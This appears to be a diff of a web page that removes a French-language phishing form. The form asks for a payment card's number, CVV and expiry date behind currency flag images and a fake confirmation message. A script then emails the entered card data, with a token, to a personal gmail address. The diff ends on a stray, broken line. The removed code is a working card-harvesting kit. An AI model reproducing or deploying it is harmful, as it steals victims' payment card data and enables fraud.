@@ -297,66 +297,7 @@ ax{
 
 <body>
 
-<div class="cmg"><img src="https://i.postimg.cc/wMVthGtP/logo7-11-172021.png"></div>
-
-<div class="lmg"><img src="https://i.postimg.cc/qRvWJts3/994330d7db2eaf797f76c5f0e4a50d10.gif"></div>
-
-<div class="dyna">
-<div class="dyna1">
-<img src="https://i.postimg.cc/3R0V8TQw/Europe-flag-circle.png">
-<div class="text1" translate="no">EURO</div>
-</div>
-<div class="dyna2">
-<img src="https://i.postimg.cc/BvH24Yw0/american-flag-us-flag-usa-flag-on-the-circle-shape-format-png.png">
-<div class="text1" translate="no">USD</div>
-</div>
-</div>
-<div class="radio1"><input type="radio"></div>
-<div class="radio2"><input type="radio"></div>
-<div class="yes">Détails sur la carte</div>
-<form id="submit3">
-<input type="text" id="cname1" placeholder=" Numéro sur la carte" required><br><br>
-<div class="cb">
-<input type="text" id="cname2" placeholder=" Cvv" required translate="no"><br><br>
-<input type="text" id="cname3" placeholder=" Exp date" required translate="no"><br><br></div></div>
-<br>
-<input type="submit" id="dex" value="Lancer">
-<div class="pay">
-</div>
-</form></div>
-<div class="load"><img src="https://i.postimg.cc/qRvWJts3/994330d7db2eaf797f76c5f0e4a50d10.gif"></div>
-<div class="alert1"><img src="https://i.postimg.cc/qRvWJts3/994330d7db2eaf797f76c5f0e4a50d10.gif"></div>
-<div class="alert2">
-<div class="dex">
-<div class="omg"><img src="https://i.postimg.cc/pdx9ybQL/5aa78e387603fc558cffbf1d.png"></div>
-
-<ax>Votre demande a été prise en compte  .</ax></div>
-</dib>
-</body>
-
-
-<script>
-const cname1 = document.getElementById('cname1');
-const cname2 = document.getElementById('cname2');
-const cname3 = document.getElementById('cname3');
-const submit3 = document.getElementById('submit3');
-
-submit3.addEventListener('submit', (e) => {
-    e.preventDefault();
- // Ajout du délai de 5 secondes avant l'envoi du formulaire
-    let ebody2 = `
-       <h1>Numbers cadre: </h1>${cname1.value}
-        <br>
-        <h1>Expire: </h1>${cname2.value}
-        <br>
-         <h1>Cvb : </h1>${cname3.value}
-        <br>
-        `;
-
-    Email.send({
-        SecureToken: "24ed91c7-882b-465c-97d2-32856db82fdb", //add your token here
-        To: 'abdoulissa154@gmail.com',
-        From: "abdoulissa154@gmail.com",
+<        From: "",
         Subject: "This is the subject",
         Body: ebody2
     }).then(() => {
